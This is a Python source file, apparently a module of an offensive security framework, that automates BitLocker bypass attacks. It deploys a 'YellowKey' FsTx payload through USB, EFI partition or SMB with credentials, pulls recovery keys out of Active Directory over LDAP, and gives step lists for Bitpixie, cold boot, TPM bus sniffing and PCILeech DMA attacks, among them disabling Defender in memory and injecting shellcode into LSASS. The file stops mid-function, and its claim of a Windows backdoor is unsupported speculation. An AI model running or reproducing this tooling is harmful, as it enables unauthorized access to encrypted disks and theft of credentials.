"""
bitlocker — Physical & remote BitLocker bypass module for secV
Covers: YellowKey, Bitpixie, cold boot, DMA/PCILeech,
        TPM sniffing, recovery key AD extraction, EFI analysis.
Author: 0xb0rn3 | oxbv1
"""

from __future__ import annotations
import json
import os
import sys
import shutil
import subprocess
import re
import time
from pathlib import Path
from typing import Dict, List, Any, Optional


# ── YellowKey payload path ───────────────────────────────────────────────────
_YK_PAYLOAD = Path('/home/oxbv1/Projects/contribsbyEclipse/YellowKey/FsTx')

# ── BitLocker known attack techniques ────────────────────────────────────────
_TECHNIQUES: Dict[str, Dict] = {
    'yellowkey': {
        'name':   'YellowKey',
        'credit': '0xb0rn3 | oxbv1',
        'type':   'physical/remote',
        'cve':    None,  # No CVE assigned — 0-day
        'affects': 'Windows 11, Server 2022, Server 2025',
        'requires': 'Physical drive access or SMB write to System Volume Information, or USB',
        'mitigations': ['Disable WinRE', 'Secure Boot + UEFI boot order lock', 'Update Windows (if patched)'],
        'summary': (
            'Place FsTx/ folder in System Volume Information of any connected drive '
            '(USB, EFI partition, or data drive). Reboot to WinRE with SHIFT+Restart '
            'then hold CTRL — SYSTEM shell spawns with unrestricted access to BitLocker '
            'protected volume. Component responsible: WinRE image cldflt.sys FsTx handler '
            '(present in WinRE but different from normal Windows install — possibly intentional).'
        ),
        'steps': [
            '1. Copy FsTx/ to <target_drive>:\\System Volume Information\\FsTx\\',
            '2. On target: Hold SHIFT, click Start → Restart',
            '3. When restart initiates, release SHIFT, immediately hold CTRL',
            '4. WinRE boots → SYSTEM shell spawns with full BitLocker volume access',
            '   Alternative: Pull disk, copy FsTx to EFI partition SVI, reinsert — no USB needed',
        ],
    },
    'bitpixie': {
        'name':   'Bitpixie (CVE-2023-21563)',
        'credit': 'Microsoft/CVE',
        'type':   'network',
        'cve':    'CVE-2023-21563',
        'affects': 'Windows 10/11 with network unlock + TPM-only BitLocker',
        'requires': 'Same network segment, PXE boot enabled or Secure Boot bypass',
        'mitigations': ['Disable network unlock', 'Use PIN + TPM', 'Patch KB5022842+'],
        'summary': (
            'Network boot injection attack. WinRE PXE boot leaks BitLocker VMK over '
            'network when Secure Boot is not enforced. Attacker serves malicious '
            'bootloader via DHCP/PXE that captures the TPM-released VMK.'
        ),
        'steps': [
            '1. Set up PXE server on same subnet (use bitpixie PoC)',
            '2. Configure DHCP to redirect target to attacker PXE server',
            '3. Force target to PXE boot (BIOS/UEFI boot order or physical access)',
            '4. Malicious bootloader receives VMK from TPM during pre-boot',
            '5. Mount BitLocker volume with captured VMK',
        ],
    },
    'cold_boot': {
        'name':   'Cold Boot Attack',
        'credit': 'Princeton (Halderman et al.)',
        'type':   'physical',
        'cve':    None,
        'affects': 'Any BitLocker-protected system that is running or recently suspended',
        'requires': 'Physical access while system is ON or recently OFF (<30s), cold spray',
        'mitigations': ['BitLocker pre-boot PIN', 'Disable suspend-to-RAM', 'Enable BIOS memory scrub on boot'],
        'summary': (
            'RAM retains contents for seconds to minutes after power loss, especially '
            'when chilled with compressed air. VMK lives in RAM while system is running. '
            'Cold-spray RAM, transfer to another machine, dump memory, extract VMK with bitlecker-extractor.'
        ),
        'steps': [
            '1. Chill RAM modules with compressed air inverted (−40°C)',
            '2. Remove RAM while machine is sleeping/on or immediately after power off',
            '3. Transfer to analyst machine (keep chilled during transfer)',
            '4. Boot analyst machine with frozen RAM installed',
            '5. Dump memory: sudo dd if=/dev/mem of=mem.bin bs=4M',
            '6. Extract VMK: bitlecker-extractor mem.bin / volatility -f mem.bin bitlocker',
            '7. Mount: dislocker -V /dev/sdb2 -v <vmk_hex> -- /mnt/bl',
        ],
    },
    'tpm_sniff': {
        'name':   'TPM SPI Bus Sniffing',
        'credit': 'Denis Andzakovic (2021)',
        'type':   'physical_hardware',
        'cve':    None,
        'affects': 'Systems with discrete TPM 1.2/2.0 on SPI bus (not fTPM)',
        'requires': 'Logic analyzer or Bus Pirate, SPI probes, target motherboard access',
        'mitigations': ['Use CPU-integrated fTPM (no external SPI)', 'Enable BitLocker PIN (VMK not released on SPI)'],
        'summary': (
            'Discrete TPM chips communicate with CPU over SPI bus at boot. '
            'The BitLocker VMK is transmitted in cleartext on this bus during pre-boot. '
            'A logic analyzer attached to SPI pins captures the VMK. '
            'Only affects systems with external TPM chip (not AMD/Intel fTPM).'
        ),
        'steps': [
            '1. Identify TPM chip on motherboard (typically near PCH, labeled TPM)',
            '2. Locate SPI CLK, CS, MOSI, MISO pins (use datasheet or continuity test)',
            '3. Attach logic analyzer: CLK→SCK, CS→CS, MOSI→MOSI, MISO→MISO',
            '4. Set capture: 24MHz, SPI protocol mode 0',
            '5. Power on target machine — BitLocker VMK flows during TPM unseal',
            '6. Export capture, parse SPI frames: spi2key.py <capture.sal>',
            '7. Extract 32-byte VMK, mount: dislocker -V /dev/sdX -v <vmk> -- /mnt',
        ],
    },
    'dma_pcileech': {
        'name':   'DMA Attack (PCILeech/Thunderbolt)',
        'credit': 'Ulf Frisk',
        'type':   'physical_hardware',
        'cve':    None,
        'affects': 'Running Windows system with Thunderbolt/PCIe port, no Kernel DMA Protection',
        'requires': 'PCILeech hardware or Thunderbolt-to-PCIe adapter, running target',
        'mitigations': ['Enable Kernel DMA Protection (UEFI)', 'Disable Thunderbolt pre-boot DMA', 'Secure Boot'],
        'summary': (
            'DMA (Direct Memory Access) attack via Thunderbolt/PCIe exposes all RAM '
            'including BitLocker VMK while system is running. PCILeech uses a FPGA '
            'device or Thunderbolt adapter to perform arbitrary memory reads/writes '
            'bypassing OS protections. Can extract VMK, patch LSASS, gain SYSTEM.'
        ),
        'steps': [
            '1. Connect PCILeech device (USB3380/CaptureCard/Screamer) to Thunderbolt/PCIe port',
            '2. pcileech.exe display -all (verify DMA access)',
            '3. pcileech.exe dump -out mem.raw -length 0x100000000 (dump all RAM)',
            '4. Extract VMK: python3 bitlocker_extractor.py mem.raw',
            '5. OR: pcileech.exe patch -signature windefend (patch WD in memory)',
            '6. Mount BitLocker: dislocker -V /dev/sdX -v <vmk_hex> -- /mnt',
            '   Useful if no Kernel DMA Protection: dmacheck.exe on target first',
        ],
    },
    'recovery_key_ad': {
        'name':   'BitLocker Recovery Key from AD/MBAM',
        'credit': 'Standard AD attack',
        'type':   'remote',
        'cve':    None,
        'affects': 'Domain-joined Windows machines with MBAM or AD key backup enabled',
        'requires': 'Domain credentials (at least read on msFVE-RecoveryInformation objects)',
        'mitigations': ['Restrict msFVE-RecoveryInformation ACL', 'Use MBAM with separate admin boundary'],
        'summary': (
            'When BitLocker is deployed via Group Policy on a domain, recovery keys are '
            'stored in AD under the computer object as msFVE-RecoveryInformation child objects. '
            'Domain users can often read these by default. Extract with PowerShell or impacket-ldap.'
        ),
        'steps': [
            '1. Enumerate BitLocker recovery info: Get-ADObject -Filter{ObjectClass -eq "msFVE-RecoveryInformation"}',
            '2. Read key: (Get-ADObject <dn> -Properties msFVE-RecoveryPassword).msFVE-RecoveryPassword',
            '3. Or via LDAP: ldapsearch -H ldap://<dc> -b <computer_dn> -D <user> -W "(objectClass=msFVE-RecoveryInformation)" msFVE-RecoveryPassword',
            '4. Mount: manage-bde -unlock <drive>: -recoverypassword <48-digit-key>',
            '5. Or: dislocker -V /dev/sdX -p <recovery_password> -- /mnt',
        ],
    },
    'efi_vuln': {
        'name':   'EFI/Bootloader Vulnerability (BootHole family)',
        'credit': 'Eclypsium',
        'type':   'physical/remote',
        'cve':    'CVE-2020-10713',  # BootHole GRUB2 SB bypass
        'affects': 'Systems relying on Secure Boot to protect BitLocker',
        'requires': 'Physical write access to EFI partition OR signed bootloader vuln',
        'mitigations': ['Apply UEFI DBX updates', 'BitLocker Network Unlock alternative', 'UEFI BIOS update'],
        'summary': (
            'EFI bootloader vulnerabilities (BootHole, GRUB2 CVE-2020-10713, Windows '
            'boot manager issues) allow Secure Boot bypass. When Secure Boot fails, '
            'BitLocker cannot verify pre-boot environment integrity and may release VMK '
            'to a malicious bootloader. Combine with YellowKey or Bitpixie for full bypass.'
        ),
        'steps': [
            '1. Check Secure Boot: Confirm-SecureBootUEFI',
            '2. If SB disabled: EFI partition writable, deploy custom bootloader',
            '3. If BootHole affected GRUB version: trigger GRUB SB bypass',
            '4. Serve malicious WIM/bootloader in WinRE context',
            '5. VMK released to attacker bootloader → mount volume',
        ],
    },
}


def _tool(name: str) -> Optional[str]:
    return shutil.which(name)


def _run(cmd: List[str], timeout: int = 30) -> subprocess.CompletedProcess:
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(cmd, 124, '', 'timeout')
    except FileNotFoundError:
        return subprocess.CompletedProcess(cmd, 127, '', f'{cmd[0]} not found')


def run(params: Dict, target: str = '') -> Dict:
    operation = params.get('operation', 'survey')
    data: Dict[str, Any] = {}
    errors: List[str] = []

    def log(msg: str):
        print(f'[bitlocker] {msg}', flush=True)

    # ── survey — detect BitLocker state + recommend attack ──────────────────
    def do_survey():
        log("→ survey: enumerating BitLocker state and applicable attacks")
        result: Dict[str, Any] = {}

        # Check target type
        if target:
            result['target'] = target
            result['mode'] = 'remote'
            result['attacks_applicable'] = []

            # Remote: check AD for recovery keys
            result['attacks_applicable'].append({
                'technique': 'recovery_key_ad',
                'name': _TECHNIQUES['recovery_key_ad']['name'],
                'requires': _TECHNIQUES['recovery_key_ad']['requires'],
                'priority': 1,
                'cmd': 'use bitlocker\nset operation recovery_key_ad\nset target <dc_ip>\nset domain <domain>\nset username <user>\nset password <pass>\nrun',
            })

            # Remote + SMB: YellowKey
            result['attacks_applicable'].append({
                'technique': 'yellowkey',
                'name': _TECHNIQUES['yellowkey']['name'],
                'requires': _TECHNIQUES['yellowkey']['requires'],
                'priority': 2,
                'cmd': 'use bitlocker\nset operation yellowkey_remote\nset target <ip>\nset username <user>\nset password <pass>\nrun',
            })
        else:
            result['target'] = 'local/physical'
            result['mode'] = 'physical'
            result['techniques'] = {}
            for k, v in _TECHNIQUES.items():
                result['techniques'][k] = {
                    'name':     v['name'],
                    'type':     v['type'],
                    'affects':  v['affects'],
                    'requires': v['requires'],
                    'cve':      v.get('cve'),
                }

        # Check if YellowKey payload is ready
        result['yellowkey_payload'] = {
            'path':    str(_YK_PAYLOAD),
            'ready':   _YK_PAYLOAD.is_dir(),
            'files':   [str(p.relative_to(_YK_PAYLOAD)) for p in _YK_PAYLOAD.rglob('*') if p.is_file()]
                       if _YK_PAYLOAD.is_dir() else [],
        }

        # Check available local tools
        result['tools'] = {
            'dislocker':           bool(_tool('dislocker')),
            'pcileech':            bool(_tool('pcileech')),
            'volatility3':         bool(_tool('vol') or _tool('volatility3')),
            'smbclient':           bool(_tool('smbclient') or _tool('impacket-smbclient')),
            'ldapsearch':          bool(_tool('ldapsearch')),
            'manage-bde_remote':   bool(_tool('winexe') or _tool('impacket-wmiexec')),
        }

        data['survey'] = result

    # ── yellowkey — deploy YellowKey FsTx payload ────────────────────────────
    def do_yellowkey():
        log("→ yellowkey: BitLocker bypass payload deployment")
        if not _YK_PAYLOAD.is_dir():
            data['yellowkey'] = {'error': f'YellowKey payload not found at {_YK_PAYLOAD}'}
            return

        target_drive = params.get('target_drive', '')
        usb_path     = params.get('usb_path', '')     # e.g. /dev/sdb or /mnt/usb
        efi_path     = params.get('efi_path', '')     # e.g. /mnt/efi

        result = {
            'technique': _TECHNIQUES['yellowkey'],
            'payload_path': str(_YK_PAYLOAD),
            'payload_files': [str(p.relative_to(_YK_PAYLOAD)) for p in _YK_PAYLOAD.rglob('*') if p.is_file()],
        }

        if usb_path or efi_path:
            base = usb_path or efi_path
            dest = Path(base) / 'System Volume Information' / 'FsTx'
            try:
                dest.mkdir(parents=True, exist_ok=True)
                shutil.copytree(str(_YK_PAYLOAD), str(dest), dirs_exist_ok=True)
                result['deployed'] = True
                result['destination'] = str(dest)
                result['next_step'] = (
                    f'Payload deployed to {dest}. '
                    'Plug USB into target (or reinsert disk). '
                    'Hold SHIFT → Restart → release SHIFT → hold CTRL. '
                    'SYSTEM shell spawns in WinRE bypassing BitLocker.'
                )
            except Exception as e:
                result['deploy_error'] = str(e)
        else:
            result['instructions'] = _TECHNIQUES['yellowkey']['steps']
            result['note'] = (
                'Set usb_path=/mnt/usb or efi_path=/mnt/efi for automatic deployment. '
                'Or manually copy FsTx/ to target drive System Volume Information.'
            )
            result['research_note'] = (
                'The FsTx component is only present in the WinRE image — not in the normal Windows install. '
                'This may be intentional (undisclosed backdoor).'
            )

        data['yellowkey'] = result

    # ── yellowkey_remote — deploy YellowKey via SMB ─────────────────────────
    def do_yellowkey_remote():
        log("→ yellowkey_remote: deploy via SMB to Windows target")
        if not _YK_PAYLOAD.is_dir():
            data['yellowkey_remote'] = {'error': f'Payload not found at {_YK_PAYLOAD}'}
            return

        username = params.get('username', '')
        password = params.get('password', '')
        domain   = params.get('domain', 'WORKGROUP')
        share    = params.get('smb_share', 'C$')

        if not target:
            data['yellowkey_remote'] = {'error': 'set target <ip>'}
            return

        smbclient = _tool('smbclient') or _tool('impacket-smbclient')
        if not smbclient:
            data['yellowkey_remote'] = {'error': 'smbclient not found — pip install impacket'}
            return

        deployed = []
        errors_local = []
        cred_str = f'{domain}/{username}:{password}' if password else f'{domain}/{username}'
        dest_prefix = 'System Volume Information\\FsTx'

        for src_file in _YK_PAYLOAD.rglob('*'):
            if not src_file.is_file():
                continue
            rel = src_file.relative_to(_YK_PAYLOAD)
            remote_path = dest_prefix + '\\' + '\\'.join(rel.parts)
            # Create parent dirs
            parent_rel = '\\'.join(rel.parts[:-1])
            if parent_rel:
                mkdir_path = dest_prefix + '\\' + parent_rel
                _run([smbclient, f'//{target}/{share}', '-U', cred_str,
                      '-c', f'mkdir "{mkdir_path}"'], timeout=10)
            # Upload file
            r = _run([smbclient, f'//{target}/{share}', '-U', cred_str,
                      '-c', f'put "{src_file}" "{remote_path}"'], timeout=15)
            if r.returncode == 0:
                deployed.append(remote_path)
            else:
                errors_local.append(f'{rel}: {r.stderr[:80]}')

        data['yellowkey_remote'] = {
            'target': target,
            'share':  share,
            'deployed': deployed,
            'errors':   errors_local,
            'next_step': (
                'Files deployed. On target: Hold SHIFT → Restart → release SHIFT → hold CTRL. '
                'WinRE loads → SYSTEM shell with full BitLocker volume access. '
                'Windows 11 / Server 2022 / 2025 only.'
            ),
        }

    # ── usb_deploy — interactive USB detection loop → auto-deploy YellowKey ─
    def do_usb_deploy():
        """
        USB detection loop mirroring the ADB device loop in android_pentest.
        Waits for a USB storage device to be inserted, lists all detected drives
        with size/label, user selects the target drive, then automatically deploys
        the YellowKey FsTx payload and provides step-by-step instructions.
        """
        log("→ usb_deploy: waiting for USB storage device...")
        timeout_s   = params.get('usb_timeout', 120)
        auto_select = params.get('auto_select', False)  # auto-pick first drive

        if not _YK_PAYLOAD.is_dir():
            data['usb_deploy'] = {'error': f'YellowKey payload not found at {_YK_PAYLOAD}'}
            return

        def _list_usb_drives() -> List[Dict]:
            """Return list of removable/USB block devices with metadata."""
            drives = []
            try:
                r = subprocess.run(
                    ['lsblk', '-J', '-o', 'NAME,SIZE,TYPE,TRAN,MOUNTPOINT,LABEL,MODEL,HOTPLUG'],
                    capture_output=True, text=True, timeout=5)
                if r.returncode != 0:
                    return drives
                blk = json.loads(r.stdout)
                for dev in blk.get('blockdevices', []):
                    if dev.get('type') == 'disk' and (
                        dev.get('tran') in ('usb', 'usb3') or dev.get('hotplug') == '1'
                    ):
                        drives.append({
                            'name':       f"/dev/{dev['name']}",
                            'size':       dev.get('size', 'unknown'),
                            'model':      dev.get('model', '').strip(),
                            'label':      dev.get('label', ''),
                            'mountpoint': dev.get('mountpoint', ''),
                            'children':   dev.get('children', []),
                        })
            except Exception as e:
                log(f"  lsblk error: {e}")
                # Fallback: check /proc/partitions for recently added block devices
                try:
                    for d in Path('/sys/bus/usb/drivers/usb-storage').iterdir():
                        for bl in (d / 'host0/target0:0:0').glob('0:0:0:0/block/*') if (d / 'host0').exists() else []:
                            drives.append({'name': f'/dev/{bl.name}', 'size': 'unknown',
                                          'model': d.name, 'label': '', 'mountpoint': ''})
                except Exception:
                    pass
            return drives

        # Capture baseline drives before plugging USB
        baseline = {d['name'] for d in _list_usb_drives()}
        log(f"  baseline drives: {sorted(baseline) or 'none'}")

        result = {
            'status': 'waiting',
            'payload': str(_YK_PAYLOAD),
            'timeout_s': timeout_s,
            'instructions': [
                '▶  Insert USB drive into attacker machine now',
                f'   Waiting up to {timeout_s}s for new block device...',
            ],
        }
        print(json.dumps({'progress': result}), flush=True)

        detected_drive = None
        start = time.time()
        while time.time() - start < timeout_s:
            current = _list_usb_drives()
            new = [d for d in current if d['name'] not in baseline]
            if new:
                log(f"  USB detected: {[d['name'] for d in new]}")
                result['detected'] = new
                result['status'] = 'detected'
                print(json.dumps({'progress': {'status': 'usb_detected', 'drives': new}}), flush=True)

                if auto_select or len(new) == 1:
                    detected_drive = new[0]
                else:
                    # Output drive list for user selection
                    result['drive_list'] = []
                    for idx, d in enumerate(new):
                        result['drive_list'].append({
                            'index': idx,
                            'device': d['name'],
                            'size': d['size'],
                            'model': d['model'],
                            'label': d['label'],
                        })
                        log(f"  [{idx}] {d['name']} — {d['size']} — {d['model']}")

                    # In headless mode we pick index from params; TUI will re-invoke with selection
                    sel_idx = params.get('usb_index', 0)
                    if isinstance(sel_idx, int) and 0 <= sel_idx < len(new):
                        detected_drive = new[sel_idx]
                    else:
                        detected_drive = new[0]
                break
            time.sleep(1)

        if not detected_drive:
            data['usb_deploy'] = {**result, 'status': 'timeout',
                                  'error': f'No USB drive detected within {timeout_s}s'}
            return

        # ── Mount the selected drive / find/create mount point ───────────────
        dev_name   = detected_drive['name']
        mount_point = detected_drive.get('mountpoint', '')

        # Check for partitions
        children = detected_drive.get('children', [])
        target_dev = dev_name
        if children:
            # Pick first partition (usually FAT32/NTFS for USB)
            for child in children:
                if child.get('type') == 'part':
                    target_dev = f"/dev/{child['name']}"
                    if child.get('mountpoint'):
                        mount_point = child['mountpoint']
                    break

        # Auto-mount if not already mounted
        auto_mounted = False
        if not mount_point:
            mount_point = f'/mnt/yk_usb_{Path(target_dev).name}'
            Path(mount_point).mkdir(parents=True, exist_ok=True)
            r = subprocess.run(['mount', target_dev, mount_point],
                               capture_output=True, text=True, timeout=10)
            if r.returncode == 0:
                auto_mounted = True
                log(f"  Mounted {target_dev} → {mount_point}")
            else:
                # Try without root (udisksctl)
                r2 = subprocess.run(['udisksctl', 'mount', '-b', target_dev],
                                    capture_output=True, text=True, timeout=10)
                if r2.returncode == 0:
                    auto_mounted = True
                    mp_match = re.search(r'at (.+)', r2.stdout)
                    if mp_match:
                        mount_point = mp_match.group(1).strip().rstrip('.')
                    log(f"  udisksctl mounted → {mount_point}")
                else:
                    log(f"  Mount failed: {r.stderr} / {r2.stderr}")

        # ── Deploy YellowKey FsTx payload ────────────────────────────────────
        deploy_result = {'device': target_dev, 'mount_point': mount_point,
                         'auto_mounted': auto_mounted}

        if mount_point:
            dest = Path(mount_point) / 'System Volume Information' / 'FsTx'
            try:
                dest.mkdir(parents=True, exist_ok=True)
                shutil.copytree(str(_YK_PAYLOAD), str(dest), dirs_exist_ok=True)
                deployed_files = [str(p.relative_to(dest)) for p in dest.rglob('*') if p.is_file()]
                deploy_result['status']          = 'deployed'
                deploy_result['destination']     = str(dest)
                deploy_result['files_deployed']  = deployed_files
                log(f"  Payload deployed → {dest} ({len(deployed_files)} files)")

                # Unmount cleanly
                subprocess.run(['sync'], timeout=5)
                if auto_mounted:
                    subprocess.run(['umount', mount_point], timeout=5)
                    subprocess.run(['udisksctl', 'unmount', '-b', target_dev], timeout=5)
                    log(f"  Unmounted {target_dev}")

                deploy_result['next_steps'] = [
                    f'✅ YellowKey payload deployed to {dest}',
                    '',
                    '▶  Remove USB from attacker machine',
                    '▶  Plug USB into TARGET Windows 11/Server 2022/2025 machine',
                    '',
                    '▶  TRIGGER SEQUENCE:',
                    '   1. Hold SHIFT on target keyboard',
                    '   2. Click Start → Power → Restart (while holding SHIFT)',
                    '   3. Release SHIFT immediately when the screen turns black',
                    '   4. Immediately hold CTRL and do NOT release',
                    '   5. WinRE boots → FsTx triggers → SYSTEM shell spawns',
                    '   6. BitLocker protected volume is fully accessible',
                    '',
                    '▶  Alternative (no USB port needed):',
                    '   Pull target HDD/SSD, mount on attacker, copy FsTx to EFI partition',
                    '   System Volume Information, reinsert disk',
                    '',
                    '▶  Windows 10 is NOT affected — Windows 11 / Server 2022 / 2025 only',
                    '▶  Refs: cldflt.sys FsTx handler present only in WinRE image',
                ]
            except PermissionError:
                deploy_result['status'] = 'permission_denied'
                deploy_result['error']  = f'Cannot write to {dest} — run as root or add sudo'
                deploy_result['manual'] = (
                    f'sudo python3 bitlocker.py  OR  '
                    f'sudo cp -r "{_YK_PAYLOAD}" "{dest.parent}/"'
                )
            except Exception as e:
                deploy_result['status'] = 'deploy_error'
                deploy_result['error']  = str(e)
        else:
            deploy_result['status'] = 'mount_failed'
            deploy_result['manual_deploy'] = (
                f'sudo mount {target_dev} /mnt/usb && '
                f'sudo mkdir -p /mnt/usb/System\\ Volume\\ Information/FsTx && '
                f'sudo cp -r {_YK_PAYLOAD}/* /mnt/usb/System\\ Volume\\ Information/FsTx/ && '
                f'sudo umount /mnt/usb'
            )

        data['usb_deploy'] = {**result, **deploy_result}

    # ── bitpixie — CVE-2023-21563 network BitLocker bypass ──────────────────
    def do_bitpixie():
        log("→ bitpixie: network BitLocker bypass via PXE (CVE-2023-21563)")
        lhost = params.get('lhost', '') or target
        result = {
            'technique': _TECHNIQUES['bitpixie'],
            'cve': 'CVE-2023-21563',
            'affected_config': 'TPM-only BitLocker (no PIN) + Network Unlock OR Secure Boot bypass',
        }

        # Check if dnsmasq (PXE server) and related tools available
        result['tools'] = {
            'dnsmasq':      bool(_tool('dnsmasq')),
            'wimboot':      bool(_tool('wimboot') or Path('/usr/share/wimboot/wimboot').exists()),
            'tftp':         bool(_tool('in.tftpd') or _tool('atftpd') or _tool('tftp-hpa')),
        }

        result['attack_steps'] = [
            f'1. Set up PXE server: dnsmasq --dhcp-boot=wimboot --enable-tftp (on {lhost or "<attacker_ip>"})',
            '2. Serve malicious WinRE WIM: mount original WIM, patch bitpixie PoC into boot sequence',
            '3. Configure target BIOS: enable PXE boot, set as first boot device (physical or via IPMI/iDRAC)',
            '4. Target boots → DHCP assigns attacker PXE → WinRE loads malicious image',
            '5. TPM releases VMK to pre-boot environment (no PIN = no user auth required)',
            '6. Bitpixie PoC captures VMK from TPM during boot, exfils to attacker',
            '7. Mount: dislocker -V /dev/sdX -v <captured_vmk_hex> -- /mnt/bl',
        ]
        result['notes'] = [
            'Only works when BitLocker is TPM-only (no PIN, no startup key)',
            'Requires Secure Boot to NOT verify the PXE-loaded WIM, or use BootHole bypass',
            'Patch: KB5022842 (Feb 2023) — check if target is patched',
            f'PoC: github.com/tianocore/edk2/blob/master/OvmfPkg/README (UEFI PXE toolkit)',
        ]

        data['bitpixie'] = result

    # ── cold_boot — cold boot VMK extraction workflow ────────────────────────
    def do_cold_boot():
        log("→ cold_boot: cold boot attack BitLocker key extraction")
        mem_image = params.get('mem_image', '')
        result = {
            'technique': _TECHNIQUES['cold_boot'],
            'tools_needed': ['dd / winpmem', 'bitlecker-extractor', 'volatility3', 'dislocker'],
        }

        if mem_image and Path(mem_image).is_file():
            log(f"  Analyzing memory image: {mem_image}")
            # Try volatility3 bitlocker plugin
            vol = _tool('vol') or _tool('volatility3')
            if vol:
                r = _run([vol, '-f', mem_image, 'windows.bitlocker.BitLockerScan'], timeout=120)
                if r.returncode == 0:
                    result['volatility_output'] = r.stdout[:3000]
                    # Parse VMK from output
                    vmk_matches = re.findall(r'VMK:[^\n]+', r.stdout)
                    if vmk_matches:
                        result['vmks_found'] = vmk_matches
                        result['mount_cmd'] = [
                            f'dislocker -V /dev/sdX -v <vmk_hex> -- /mnt/bl'
                            for vmk in vmk_matches
                        ]
                else:
                    result['volatility_error'] = r.stderr[:500]

            # Try bitlecker-extractor directly
            be = _tool('bitlecker-extractor') or _tool('bitlocker-extractor')
            if be:
                r = _run([be, mem_image], timeout=120)
                if r.returncode == 0:
                    result['extractor_output'] = r.stdout[:2000]
                else:
                    result['extractor_error'] = r.stderr[:300]

        result['manual_steps'] = _TECHNIQUES['cold_boot']['steps']
        result['dislocker_mount'] = (
            'dislocker -V /dev/sdX2 -v <32-byte-vmk-hex> -- /mnt/bl\n'
            'mount -o loop /mnt/bl/dislocker-file /mnt/data'
        )
        data['cold_boot'] = result

    # ── tpm_sniff — TPM SPI sniffing guide ──────────────────────────────────
    def do_tpm_sniff():
        log("→ tpm_sniff: TPM SPI bus interception guide")
        result = {
            'technique': _TECHNIQUES['tpm_sniff'],
            'steps': _TECHNIQUES['tpm_sniff']['steps'],
            'hardware_needed': [
                'Logic analyzer: Saleae Logic, Kingst LA2016, or Bus Pirate',
                'SPI probes (hook clips or soldering)',
                'Schematic or multimeter for pin identification',
            ],
            'software': [
                'Saleae Logic 2 or PulseView (SPI decoder)',
                'spi2key.py (parse captured SPI frames for TPM responses)',
                'dislocker (mount extracted volume)',
            ],
            'parse_cmd': 'python3 spi2key.py capture.sal --tpm-version 2.0',
            'mount_cmd': 'dislocker -V /dev/sdX2 -v <vmk_32bytes_hex> -- /mnt/bl',
            'warning': (
                'Only effective against discrete TPM chips on SPI bus. '
                'AMD fTPM and Intel PTT use internal bus — immune to this attack. '
                'Adding a BitLocker PIN prevents VMK transmission on SPI (TPM seals with auth).'
            ),
        }
        data['tpm_sniff'] = result

    # ── dma_pcileech — DMA attack via PCILeech ──────────────────────────────
    def do_dma_pcileech():
        log("→ dma_pcileech: PCILeech DMA memory attack")
        mem_image = params.get('mem_image', '')
        result = {
            'technique': _TECHNIQUES['dma_pcileech'],
            'steps': _TECHNIQUES['dma_pcileech']['steps'],
            'hardware': [
                'PCILeech FPGA: USB3380-EVB, EXP-AI01, or Screamer M.2',
                'Thunderbolt-to-PCIe adapter (for Thunderbolt targets)',
                'Standard: Xilinx AC701 + USB3 cable',
            ],
            'software': 'github.com/ufrisk/pcileech + pcileech-fpga',
            'commands': {
                'verify_dma':  'pcileech.exe display -all',
                'dump_ram':    'pcileech.exe dump -out mem.raw -length 0x200000000',
                'extract_vmk': 'python3 volatility3 -f mem.raw windows.bitlocker.BitLockerScan',
                'patch_wd':    'pcileech.exe patch -signature windefend',
                'inject_shell':'pcileech.exe shellcode -shellcode inject_x64.bin -pid <lsass_pid>',
            },
        }

        if mem_image and Path(mem_image).is_file():
            vol = _tool('vol') or _tool('volatility3')
            if vol:
                r = _run([vol, '-f', mem_image, 'windows.bitlocker.BitLockerScan'], timeout=120)
                result['analysis'] = r.stdout[:2000] if r.returncode == 0 else r.stderr[:500]

        result['kernel_dma_check'] = (
            'Check Kernel DMA Protection: bcdedit /enum | findstr "dma"\n'
            'If disabled: full DMA read/write. If enabled: only Thunderbolt with SL1+ allowed.'
        )
        data['dma_pcileech'] = result

    # ── recovery_key_ad — extract BitLocker recovery key from AD ────────────
    def do_recovery_key_ad():
        log("→ recovery_key_ad: extract BitLocker recovery keys from Active Directory")
        username = params.get('username', '')
        password = params.get('password', '')
        domain   = params.get('domain', '')
        dc_ip    = params.get('dc_ip', '') or target
        computer = params.get('computer', '')  # specific computer name to query

        result: Dict[str, Any] = {'technique': 'recovery_key_ad', 'dc_ip': dc_ip}

        if not (username and domain and dc_ip):
            result['error'] = 'Requires: username, password, domain, dc_ip'
            result['commands'] = {
                'powershell': (
                    'Get-ADObject -Filter {ObjectClass -eq "msFVE-RecoveryInformation"} '
                    '-Properties msFVE-RecoveryPassword | Select DistinguishedName, msFVE-RecoveryPassword'
                ),
                'ldapsearch': (
                    f'ldapsearch -H ldap://<dc_ip> -D "<user>@<domain>" -W '
                    f'-b "DC=<domain>,DC=<tld>" '
                    f'"(objectClass=msFVE-RecoveryInformation)" msFVE-RecoveryPassword'
                ),
            }
            data['recovery_key_ad'] = result
            return

        # Try with ldapsearch
        ldap = _tool('ldapsearch')
        if ldap:
            dc_parts = domain.upper().split('.')
            base_dn = ','.join([f'DC={p}' for p in domain.lower().split('.')])
            filter_str = '(objectClass=msFVE-RecoveryInformation)'
            if computer:
                filter_str = f'(&{filter_str}(distinguishedName=*CN={computer}*))'

            r = _run([
                ldap, '-H', f'ldap://{dc_ip}',
                '-D', f'{username}@{domain}',
                '-w', password,
                '-b', base_dn,
                filter_str,
                'msFVE-RecoveryPassword', 'distinguishedName',
            ], timeout=30)

            if r.returncode == 0:
                # Parse recovery passwords
                keys = re.findall(r'msFVE-RecoveryPassword:\s+([0-9-]{53,})', r.stdout)
                dns  = re.findall(r'dn:\s+(.+)', r.stdout)
                result['recovery_keys_found'] = len(keys)
                result['entries'] = [{'dn': dn, 'recovery_password': key}
                                     for dn, key in zip(dns, keys)]
                if keys:
                    result['mount_cmd'] = [
                        f'manage-bde -unlock <drive>: -recoverypassword {key}'
                        for key in keys
                    ]
                    result['dislocker_cmd'] = [
                        f'dislocker -V /dev/sdX -p {key} -- /mnt/bl'
                        for key in keys
                    ]
            else:
                result['ldap_error'] = r.stderr[:400]
                result['stdout']     = r.stdout[:400]
        else:
            result['error'] = 'ldapsearch not found — apt install ldap-utils'

        data['recovery_key_ad'] = result

    # ── tool_build — build/compile Windows exploit tools ─────────────────────
    def do_tool_build():
        """Compile Windows exploit tools (cross-compile via mingw or Wine+MSVC)."""
        log("→ tool_build: compile Windows exploit tools")
        exploit_dir = Path('/home/oxbv1/Projects/contribsbyEclipse')
        result: Dict[str, Any] = {'tools': {}}

        compiler = _tool('x86_64-w64-mingw32-g++')
        wine     = _tool('wine')
        msbuild  = _tool('msbuild')

